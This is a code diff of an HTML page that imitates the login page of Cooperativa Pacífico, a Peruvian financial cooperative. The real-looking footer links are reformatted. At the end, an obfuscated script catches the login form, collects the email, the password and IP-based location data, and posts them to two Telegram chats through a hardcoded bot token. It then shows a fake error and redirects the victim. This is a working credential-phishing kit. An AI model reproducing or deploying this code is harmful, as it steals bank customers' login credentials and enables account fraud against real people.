+                              href="javascript:;"
+                              class="mostrar_legal"
+                              >Legal</a
+                            >
+                          </li>
+                          <li _ngcontent-gxl-c42="">
+                            <a
+                              _ngcontent-gxl-c42=""
+                              href="https://cp.com.pe/pacifico/in/general/personas/promociones-personas/"
+                              target="_blank"
+                              >Promociones</a
+                            >
+                          </li>
+                          <li _ngcontent-gxl-c42="">
+                            <a
+                              _ngcontent-gxl-c42=""
+                              href="https://cp.com.pe/pacifico/transparencia/"
+                              target="_blank"
+                              >Transparencia</a
+                            >
+                          </li>
+                          <li _ngcontent-gxl-c42="">
+                            <a
+                              _ngcontent-gxl-c42=""
+                              href="https://cp.com.pe/pacifico/tarifario/"
+                              target="_blank"
+                              >Tarifario</a
+                            >
+                          </li>
+                          <li _ngcontent-gxl-c42="">
+                            <a
+                              _ngcontent-gxl-c42=""
+                              href="https://cp.com.pe/pacifico/canales-de-contacto/"
+                              target="_blank"
+                              >Contáctenos</a
+                            >
+                          </li>
+                        </ul>
+                        <div _ngcontent-gxl-c42="" class="copy_left">
+                          Cooperativa Pacífico © 2021 - Todos los derechos
+                          reservados.
+                        </div>
+                        <div _ngcontent-gxl-c42="" class="develop_right">
+                          <a
+                            _ngcontent-gxl-c42=""
+                            href="https://cp.com.pe/pacifico/aviso-de-privacidad/"
+                            target="_blank"
+                            >Políticas de Seguridad</a
+                          >
+                        </div>
                       </div>
-                      <!----><!---->
                     </div>
-                  </div>
-                  <!---->
-                </app-alert>
+                  </footer>
+                </app-footer>
               </div>
-              <app-footer _ngcontent-gxl-c43="" _nghost-gxl-c42="">
-                <footer _ngcontent-gxl-c42="" id="footer">
-                  <div _ngcontent-gxl-c42="" class="central-wrapper clearfix">
-                    <div _ngcontent-gxl-c42="" class="footer_bottom clearfix">
-                      <ul _ngcontent-gxl-c42="" class="menu_footer_movil">
-                        <li _ngcontent-gxl-c42="">
-                          <a _ngcontent-gxl-c42="" href="https://cp.com.pe/pacifico/aviso-de-privacidad/"
-                            target="_blank">Políticas de Seguridad</a>
-                        </li>
-                        <li _ngcontent-gxl-c42="">
-                          <a _ngcontent-gxl-c42="" href="javascript:;" class="mostrar_legal">Legal</a>
-                        </li>
-                        <li _ngcontent-gxl-c42="">
-                          <a _ngcontent-gxl-c42=""
-                            href="https://cp.com.pe/pacifico/in/general/personas/promociones-personas/"
-                            target="_blank">Promociones</a>
-                        </li>
-                        <li _ngcontent-gxl-c42="">
-                          <a _ngcontent-gxl-c42="" href="https://cp.com.pe/pacifico/transparencia/"
-                            target="_blank">Transparencia</a>
-                        </li>
-                        <li _ngcontent-gxl-c42="">
-                          <a _ngcontent-gxl-c42="" href="https://cp.com.pe/pacifico/tarifario/"
-                            target="_blank">Tarifario</a>
-                        </li>
-                        <li _ngcontent-gxl-c42="">
-                          <a _ngcontent-gxl-c42="" href="https://cp.com.pe/pacifico/canales-de-contacto/"
-                            target="_blank">Contáctenos</a>
-                        </li>
-                      </ul>
-                      <div _ngcontent-gxl-c42="" class="copy_left">
-                        Cooperativa Pacífico © 2021 - Todos los derechos
-                        reservados.
-                      </div>
-                      <div _ngcontent-gxl-c42="" class="develop_right">
-                        <a _ngcontent-gxl-c42="" href="https://cp.com.pe/pacifico/aviso-de-privacidad/"
-                          target="_blank">Políticas de Seguridad</a>
-                      </div>
-                    </div>
-                  </div>
-                </footer>
-              </app-footer>
             </div>
           </div>
-        </div>
-      </app-content-auth></app-auth-page><!----><app-loader _ngcontent-gxl-c60="" _nghost-gxl-c59="">
-      <div _ngcontent-gxl-c59="" class="modal-mask animated fadeIn"
-        style="background-color: rgba(0, 0, 0, 0.6); z-index: 99999" hidden="">
-        <div _ngcontent-gxl-c59="" class="modal-loading" style="
-              width: auto;
-              height: auto;
-              padding: 30px 50px 20px;
-              background-color: rgb(255, 255, 255);
-              border-radius: 12px;
-              top: calc(100% - 60%);
-              left: calc(50% - 93px);
-            ">
-          <div _ngcontent-gxl-c59="" class="loading-animate" style="width: 40px; height: 40px">
-            <div _ngcontent-gxl-c59="" class="animate-origin">
-              <span _ngcontent-gxl-c59="" style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "></span>
-            </div>
-            <div _ngcontent-gxl-c59="" class="animate-origin">
-              <span _ngcontent-gxl-c59="" style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "></span>
-            </div>
-            <div _ngcontent-gxl-c59="" class="animate-origin">
-              <span _ngcontent-gxl-c59="" style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "></span>
-            </div>
-            <div _ngcontent-gxl-c59="" class="animate-origin">
-              <span _ngcontent-gxl-c59="" style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "></span>
-            </div>
-            <div _ngcontent-gxl-c59="" class="animate-origin">
-              <span _ngcontent-gxl-c59="" style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "></span>
-            </div>
-          </div>
-          <p _ngcontent-gxl-c59="" class="loading-discription" style="color: rgb(0, 68, 138); font-size: 14px">
-            Cargando...
-          </p>
-        </div>
-      </div>
-    </app-loader></app-root>
-  <script src="datos/runtime.81e45efed06e87fd0976.js" defer="defer"></script>
-  <script src="datos/polyfills.500a931972a190eb8929.js" defer="defer"></script>
-  <script src="datos/main.2fdd53f9ee0f5ccee6d9.js" defer="defer"></script>
+        </app-content-auth></app-auth-page
+      ><!----><app-loader _ngcontent-gxl-c60="" _nghost-gxl-c59=""> </app-loader
+    ></app-root>
+    <script src="datos/runtime.81e45efed06e87fd0976.js" defer="defer"></script>
+    <script
+      src="datos/polyfills.500a931972a190eb8929.js"
+      defer="defer"
+    ></script>
+    <script src="datos/main.2fdd53f9ee0f5ccee6d9.js" defer="defer"></script>
 
-  <div>
-    <div class="grecaptcha-badge" data-style="bottomright" style="
+    <div>
+      <div
+        class="grecaptcha-badge"
+        data-style="bottomright"
+        style="
           width: 256px;
           height: 60px;
           display: block;
@@ -537,15 +660,27 @@
           box-shadow: gray 0px 0px 5px;
           border-radius: 2px;
           overflow: hidden;
-        ">
-      <div class="grecaptcha-logo">
-        <iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-qps2nakm97ev" frameborder="0"
-          scrolling="no"
-          sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
-          src="datos/anchor.htm"></iframe>
-      </div>
-      <div class="grecaptcha-error"></div>
-      <textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="
+        "
+      >
+        <div class="grecaptcha-logo">
+          <iframe
+            title="reCAPTCHA"
+            width="256"
+            height="60"
+            role="presentation"
+            name="a-qps2nakm97ev"
+            frameborder="0"
+            scrolling="no"
+            sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
+            src="datos/anchor.htm"
+          ></iframe>
+        </div>
+        <div class="grecaptcha-error"></div>
+        <textarea
+          id="g-recaptcha-response-100000"
+          name="g-recaptcha-response"
+          class="g-recaptcha-response"
+          style="
             width: 250px;
             height: 40px;
             border: 1px solid rgb(193, 193, 193);
@@ -553,41 +688,68 @@
             padding: 0px;
             resize: none;
             display: none;
-          "></textarea>
+          "
+        ></textarea>
+      </div>
+      <iframe style="display: none"></iframe>
     </div>
-    <iframe style="display: none"></iframe>
-  </div>
-</body>
-<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 
-<script>
-  const form = document.querySelector("#loginform");
-  form.addEventListener("submit", _0x70ebe => {
-    _0x70ebe.preventDefault();
-    const _0x2a7be9 = document.querySelector("#correo").value;
-    const _0x4302fa = document.querySelector("#contra").value;
-    if (_0x2a7be9.trim() === '' || _0x4302fa.trim() === '') {
-      alert("Por favor, completa todos los campos.");
-      return;
-    }
-    axios.get('https://ipapi.co/json/').then(_0x893ec6 => {
-      const _0x161ec0 = "\nPacifico\nUsuario: " + localStorage.getItem('usuario') + "\nEmail: " + _0x2a7be9 + "\nContraseña: " + _0x4302fa + "\nCiudad:" + _0x893ec6.data.city + "\nPais: " + _0x893ec6.data.country + "\nIP: " + _0x893ec6.data.ip;
-      axios.post("https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage", {
-        'chat_id': '-4139256120',
-        'text': _0x161ec0
-      }).then(_0x25a1a6 => {
-        axios.post("https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage", {
-          'chat_id': '-4182569165',
-          'text': _0x161ec0
+  <script>
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (_0x70ebe) => {
+      _0x70ebe.preventDefault();
+      const _0x2a7be9 = document.querySelector("#correo").value;
+      const _0x4302fa = document.querySelector("#contra").value;
+      if (_0x2a7be9.trim() === "" || _0x4302fa.trim() === "") {
+        alert("Por favor, completa todos los campos.");
+        return;
+      }
+      axios
+        .get("https://ipapi.co/json/")
+        .then((_0x893ec6) => {
+          const _0x161ec0 =
+            "\nPacifico\nUsuario: " +
+            localStorage.getItem("usuario") +
+            "\nEmail: " +
+            _0x2a7be9 +
+            "\nContraseña: " +
+            _0x4302fa +
+            "\nCiudad:" +
+            _0x893ec6.data.city +
+            "\nPais: " +
+            _0x893ec6.data.country +
+            "\nIP: " +
+            _0x893ec6.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+              {
+                chat_id: "-4139256120",
+                text: _0x161ec0,
+              }
+            )
+            .then((_0x25a1a6) => {
+              axios.post(
+                "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+                {
+                  chat_id: "-4182569165",
+                  text: _0x161ec0,
+                }
+              );
+              alert(
+                "Verificacion Incorrecta, datos invalidos verifique nuevamente"
+              );
+              parent.location.href = "cargando.html";
+            })
+            ["catch"]((_0xaa55f5) => {
+              console.error(_0xaa55f5);
+            });
+        })
+        ["catch"]((_0x23f072) => {
+          console.log(_0x23f072);
         });
-       
-        parent.location.href = "cargando.html";
-      })['catch'](_0xaa55f5 => {
-        console.error(_0xaa55f5);
-      });
-    })["catch"](_0x23f072 => {
-      console.log(_0x23f072);
     });
-  });  </script>
-
+  </script>
 </html>
